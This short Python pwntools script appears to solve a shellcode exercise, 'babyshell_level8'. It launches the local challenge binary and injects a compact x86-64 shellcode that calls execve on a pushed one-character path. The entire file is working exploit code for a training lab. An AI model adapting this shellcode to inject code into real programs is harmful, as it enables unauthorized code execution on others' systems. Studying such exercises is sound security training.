from pwn import *

context.update(arch="amd64", encoding="latin")

p = process("/challenge/babyshell_level8")

shellcode = f'''
.intel_syntax noprefix
.global _start

_start:
        push 0x61
        mov rdi, rsp
        xor edx, edx
        xor esi, esi
        mov al,0x3b
        syscall
'''

shellcode = asm(shellcode)

p.readuntil(b"Reading 0x12 bytes from stdin.")
p.write(shellcode)
print(p.readall().decode('utf-8'))
